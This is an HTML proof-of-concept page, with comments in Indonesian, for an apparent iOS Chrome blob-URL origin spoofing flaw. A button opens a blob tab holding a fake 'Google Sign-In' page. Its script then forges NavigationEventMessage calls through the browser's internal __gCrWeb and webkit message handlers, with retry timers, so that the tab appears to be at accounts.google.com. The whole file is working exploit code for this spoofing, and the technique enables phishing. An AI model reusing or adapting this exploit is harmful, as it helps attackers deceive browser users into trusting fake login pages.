<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>CVE-2026-95291 PoC - Blob Origin Spoofing</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #000;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container {
        text-align: center;
        padding: 30px;
      }
      button {
        padding: 20px 40px;
        font-size: 18px;
        font-weight: bold;
        background: #007aff;
        color: #fff;
        border: none;
        border-radius: 12px;
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(0, 122, 255, 0.4);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <button id="exploitBtn">JALANKAN BLOB SPOOFING PoC</button>
    </div>

    <script>
      document.getElementById("exploitBtn").onclick = async function () {
        this.remove();

        // 1. Membuat payload HTML attacker untuk dokumen blob
        const attackerHtml = `
          <!DOCTYPE html>
          <html>
          <head>
            <meta charset="utf-8">
            <title>Accounts - Google Sign In</title>
          </head>
          <body style="margin:0;padding:0;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
            <div style="padding: 30px; max-width: 500px;">
              <h1 style="font-size:32px;font-weight:800;color:#202124;margin:0 0 16px 0;">Google Sign-In</h1>
              <p style="font-size:16px;color:#5f6368;margin:0 0 24px 0;">Sesi Anda telah kedaluwarsa. Silakan verifikasi identitas Anda.</p>
              <div style="border: 1px solid #dadce0; padding: 20px; border-radius: 8px; background: #f8f9fa;">
                <p style="font-size:14px; color:#c5221f; font-weight:600; margin:0;">[Simulasi Spoofed Content Kontrol Penyerang]</p>
              </div>
            </div>
          </body>
          </html>
        `;

        // 2. Mengubah payload menjadi Blob URL lokal
        const blob = new Blob([attackerHtml], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);

        // 3. Membuka tab baru yang mengarah ke blob URL lokal
        const targetTab = window.open(blobUrl, "_blank");

        if (targetTab) {
          // Fungsi eksekusi forged message untuk memicu spoofing via NavigationEventMessage
          const triggerSpoof = () => {
            try {
              // Membaca frameId dari lingkungan page-world gCrWeb
              if (targetTab.window.__gCrWeb && typeof targetTab.window.__gCrWeb.getFrameId === 'function') {
                const frameId = targetTab.window.__gCrWeb.getFrameId();
                
                // Mendaftarkan frame secara manual jika diperlukan
                if (typeof targetTab.window.__gCrWeb.registerFrame === 'function') {
                  targetTab.window.__gCrWeb.registerFrame();
                }

                // Mengirimkan pesan forged didReplaceState langsung ke handler native iOS Chrome
                if (targetTab.window.webkit && targetTab.window.webkit.messageHandlers && targetTab.window.webkit.messageHandlers.NavigationEventMessage) {
                  
                  // Mengirim willChangeState terlebih dahulu untuk memenuhi syarat internal dcheck/state
                  targetTab.window.webkit.messageHandlers.NavigationEventMessage.postMessage({
                    command: "willChangeState",
                    frame_id: frameId
                  });

                  // Mengirim didReplaceState dengan memalsukan pageUrl ke target domain tepercaya (misal: accounts.google.com)
                  targetTab.window.webkit.messageHandlers.NavigationEventMessage.postMessage({
                    command: "didReplaceState",
                    pageUrl: "blob:https://accounts.google.com/signin",
                    baseUrl: "https://x/",
                    stateObject: "",
                    frame_id: frameId
                  });
                  
                  console.log("Forged navigation message dispatched successfully.");
                }
              }
            } catch (err) {
              console.error("Exploit dispatch error:", err);
            }
          };

          // Retry timing untuk mengatasi race condition registrasi frame di DOM parsing awal
          setTimeout(triggerSpoof, 150);
          setTimeout(triggerSpoof, 500);
          setTimeout(triggerSpoof, 1200);
        }
      };
    </script>
  </body>
</html>
